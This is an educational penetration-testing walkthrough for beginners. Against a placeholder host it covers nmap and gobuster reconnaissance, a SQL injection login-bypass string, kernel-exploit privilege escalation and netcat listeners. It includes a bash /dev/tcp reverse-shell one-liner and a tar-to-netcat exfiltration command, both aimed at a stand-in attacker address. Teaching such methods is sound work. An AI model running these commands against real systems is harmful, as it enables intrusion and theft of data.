Offensive Security Assessment

Welcome to this educational walkthrough of an offensive security assessment! In this guide, we'll break down a penetration test step-by-step, focusing on how an attacker might gain initial access, escalate their privileges, and achieve their objectives. This is designed for beginners, so we'll explain every step and concept clearly.

This assessment simulated an attacker targeting an organization's external-facing systems and then moving deeper into the internal network.

Objectives of the Assessment:

  • External Foothold: To gain initial access to the target's network through a publicly accessible service that has a known vulnerability.
  • Privilege Escalation: Once inside, to gain higher-level permissions (like administrator or root access) by exploiting a weakness on the compromised system.
  • Data Exfiltration: To demonstrate the ability to steal sensitive information, simulating a real-world data breach.

Reconnaissance

The first phase of any security assessment is reconnaissance, where we gather as much information as possible about the target without actively probing it too much. This is like a spy doing their homework before a mission.

Port Scanning with Nmap

Our first step was to scan the target's IP address to see which ports are open and what services are running on them. The nmap tool is our go-to for this.

nmap -sC -sV -oN nmap_scan.txt 10.10.10.10

ðŸ§  Beginner Analysis

  • nmap: This is the Network Mapper, a powerful tool for discovering hosts and services on a computer network.
  • -sC: This flag tells Nmap to run the default set of Nmap Scripting Engine (NSE) scripts. These scripts can detect a wide range of vulnerabilities and gather more detailed information about services.
  • -sV: This flag enables version detection. Nmap will try to determine the exact version of the service running on each open port (e.g., Apache 2.4.41, OpenSSH 8.2p1). Knowing the version is crucial because specific versions often have known vulnerabilities.
  • -oN nmap_scan.txt: This tells Nmap to save the output in a "normal" format to a file named nmap_scan.txt. This is good practice for keeping records of our scans.
  • 10.10.10.10: This is the IP address of the target machine we are scanning.

Interpreting the Results:

Let's imagine our Nmap scan returned something like this:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

  • PORT STATE SERVICE VERSION: These are the columns Nmap provides.

    • PORT: The port number and protocol (e.g., 22/tcp).
    • STATE: Whether the port is open, closed, or filtered. An open port means a service is actively listening for connections.
    • SERVICE: The service Nmap thinks is running on that port, based on common port numbers or its script detections.
    • VERSION: The specific version of the service.

  • 22/tcp open ssh OpenSSH 8.2p1...: This tells us that port 22, commonly used for Secure Shell (SSH), is open and running OpenSSH version 8.2p1 on an Ubuntu system. SSH is used for secure remote login, and while it's generally secure, vulnerabilities can exist in specific versions or configurations.

  • 80/tcp open http Apache httpd 2.4.41...: This indicates that port 80, the standard port for HTTP (web servers), is open and running Apache version 2.4.41 on Ubuntu. Web servers are a very common attack vector because they are directly exposed to the internet and can host web applications that might have vulnerabilities.

Why is this interesting?

An open web server on port 80 is a prime target. We need to investigate what website is being hosted there and if there are any known vulnerabilities associated with Apache 2.4.41 or the specific web application.

Enumeration

After reconnaissance, we move to enumeration. This is where we actively probe the discovered services to gather more detailed information, looking for specific weaknesses.

Web Directory Brute-forcing with Gobuster

Since we found a web server on port 80, the next logical step is to see what files and directories are hidden on that web server. Many web servers don't expose all their directories publicly. We use a tool called gobuster to try and find them.

gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

ðŸ§  Beginner Analysis

  • gobuster: A fast directory and file enumeration tool for web servers.
  • dir: This subcommand tells gobuster we are looking for directories and files.
  • -u http://10.10.10.10: Specifies the target URL.
  • -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: This points to a wordlist file. A wordlist is a collection of common directory and file names (like "admin", "login", "backup", "config"). gobuster will try each of these names, appending them to the target URL, to see if they exist. Using a "medium" sized list is a good balance between speed and thoroughness for initial scans.
  • -x php,html,txt: This tells gobuster to append common file extensions to the directory names. So, it will not only look for /admin but also /admin.php, /admin.html, /admin.txt, etc.

Interpreting the Results:

Imagine gobuster finds a hidden directory:

/admin           (Status: 200)
/backup          (Status: 200)
/config.php      (Status: 200)
  • /admin (Status: 200): This means a directory named "admin" exists on the web server, and a 200 OK status code indicates it was found successfully. An "admin" panel is a common place for attackers to look for login forms or management interfaces.
  • /backup (Status: 200): A backup directory might contain sensitive files or configurations that were not meant to be public.
  • /config.php (Status: 200): This is a PHP configuration file. If it's accessible, it might contain database credentials, API keys, or other sensitive information.

In this scenario, we would navigate our browser to http://10.10.10.10/admin. Let's say we find a login page.

Exploitation

Now that we've found potential weaknesses, it's time to exploit them to gain access.

Exploiting a Web Application Vulnerability

Continuing from the web enumeration, let's say we discover that the web application on http://10.10.10.10/ is vulnerable to SQL Injection.

What is SQL Injection?

SQL Injection (SQLi) is a type of vulnerability where an attacker can interfere with the queries that an application makes to its database. By inserting malicious SQL code into input fields, an attacker can trick the database into revealing sensitive data, modifying data, or even executing commands on the underlying operating system.

We might find a login form where entering ' OR '1'='1 in the username field bypasses authentication.

Once authenticated or if we found a vulnerability that gives us direct command execution, we might upload a reverse shell.

What is a Reverse Shell?

Normally, when you connect to a server using SSH or telnet, you initiate the connection from your machine to the server. This is called a "bind shell" because the service is "bound" to a port on the server.

A "reverse shell" is the opposite. The compromised server initiates a connection back to our attacker machine. This is often used to bypass firewalls that might block incoming connections but allow outgoing ones.

Example Scenario:

Suppose we exploited a file upload vulnerability in the web application. We could upload a simple PHP script that executes a reverse shell command.

On our attacker machine, we would set up a listener:

nc -lvnp 4444

ðŸ§  Beginner Analysis

  • nc: This is Netcat, often called the "Swiss Army knife" for TCP/IP. It can be used to read and write data across network connections.
  • -l: Listen mode. nc will wait for an incoming connection.
  • -v: Verbose mode. Provides more detailed output about the connection.
  • -n: Numeric-only IP addresses, don't resolve hostnames.
  • -p 4444: The port number to listen on. We choose an arbitrary port (4444) that is not typically used by critical services.

Then, on the compromised server via the web shell, we'd execute a command like this (depending on the server's OS):

# Example for Linux
bash -i >& /dev/tcp/OUR_ATTACKER_IP/4444 0>&1

Interpreting the Results:

When the reverse shell command runs on the target, it will attempt to connect back to our listening nc instance on OUR_ATTACKER_IP:4444. If successful, our nc terminal will show a connection, and we'll have a command prompt on the target machine!

listening on [any] 4444 ...
connect to [10.10.10.5] from (UNKNOWN) [10.10.10.10] 54321

This connect to... line means the target machine (10.10.10.10) has successfully connected back to our attacker machine (10.10.10.5) on port 4444. We now have a shell!

Privilege Escalation

Having a shell is great, but usually, it's with limited permissions (a "low-privilege" user). To achieve objectives like data exfiltration, we often need higher privileges, such as root (on Linux) or Administrator (on Windows). This is called Privilege Escalation.

Exploiting a Local Kernel Vulnerability

We've gained a shell as a low-privileged user. Now, we need to find a way to become the "root" user. A common method is to find a vulnerability in the operating system's kernel. The kernel is the core of the operating system, and if it has a bug, we can sometimes use that bug to gain full control.

We would typically use a script like linpeas.sh or manually check for:

  1. Kernel Version: Is it an old, known-vulnerable version?
  2. SUID Binaries: Are there any executables that run with the permissions of the owner (often root), even when run by a regular user?
  3. Misconfigured Services: Are there services running as root that can be manipulated?

What is SUID?

SUID (Set User ID) is a special permission bit on Linux/Unix systems. When an executable file has the SUID bit set and is owned by root, running that executable will grant the user who ran it the privileges of the owner (root) for the duration of that execution. For example, if /usr/bin/find was vulnerable and had SUID set for root, a regular user could use it to execute commands as root.

Let's assume we found an outdated kernel version and searched for exploits for it on exploit-db.com. We might find a public exploit, download it to the target machine (often by transferring it via wget or using our existing reverse shell), and compile it.

For example, a kernel exploit might be run like this:

./exploit_name

ðŸ§  Beginner Analysis

  • ./exploit_name: This command executes a program named exploit_name from the current directory (.).
  • Kernel Exploits: These are programs specifically designed to leverage bugs in the operating system's kernel. They are often complex and require precise execution.

Interpreting the Results:

If the kernel exploit is successful, it will typically spawn a new shell with root privileges.

# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
  • whoami: This command shows the current username. Seeing root confirms we have escalated our privileges.
  • id: This command shows the user ID (UID) and group ID (GID). uid=0 is the standard UID for the root user on Linux systems.

We have now achieved root access on the compromised system!

Data Exfiltration

Our final objective was to simulate the exfiltration of sensitive diagnostic data. With root privileges, we have access to almost anything on the system.

Locating and Transferring Data

We would now search for sensitive files. In a real scenario, this could be database dumps, configuration files containing credentials, customer data, or internal project documents. For this simulation, let's assume we found a directory with diagnostic logs containing valuable information.

We might find the data at /var/log/diagnostics/. To exfiltrate it, we could use scp (Secure Copy) if we had SSH access from our attacker machine to the target, or if the target has an outbound connection to a server we control.

A common method is to compress the data and then serve it over a simple HTTP server from the compromised machine, or use nc to pipe it directly.

Example using Netcat for Exfiltration:

  1. On the Target Machine (as root):
    We can create a compressed archive of the sensitive data and then pipe it into nc to send it to our attacker machine.

    bash tar -czvf - /var/log/diagnostics | nc OUR_ATTACKER_IP 5555

    • tar -czvf - /var/log/diagnostics: This command creates a compressed archive (-c, -z for gzip, -v for verbose, -f - to output to standard output).
    • |: The pipe symbol sends the output of the tar command as input to the nc command.
    • nc OUR_ATTACKER_IP 5555: Connects to our attacker machine's IP address on port 5555 and sends the data.

  2. On the Attacker Machine:
    We listen on the specified port and redirect the incoming data to a file.

    bash nc -lvnp 5555 > sensitive_data.tar.gz

    • nc -lvnp 5555: Listens on port 5555.
    • > sensitive_data.tar.gz: Redirects all incoming data to a file named sensitive_data.tar.gz.

ðŸ§  Beginner Analysis

  • tar: A common utility used to bundle multiple files into a single archive file (often called a tarball). The options used (-czvf) compress the archive using gzip (-z).
  • Piping (|): This is a fundamental concept in command-line interfaces. It allows the output of one command to be used as the input of another command.
  • nc for Data Transfer: As seen before, Netcat is incredibly versatile. Here, it's used not just for shells, but for raw data transfer. By listening (-l) on a port, it accepts incoming data and saves it to a file.

Interpreting the Results:

Once the transfer is complete, we will have a file named sensitive_data.tar.gz on our attacker machine. We can then extract it to verify that we have successfully exfiltrated the simulated sensitive diagnostic data.

This walkthrough demonstrates a typical penetration testing methodology, from initial discovery to achieving advanced objectives. Remember, the key to offensive security is understanding how systems work, where common vulnerabilities lie, and how to leverage tools to find and exploit them ethically and legally.
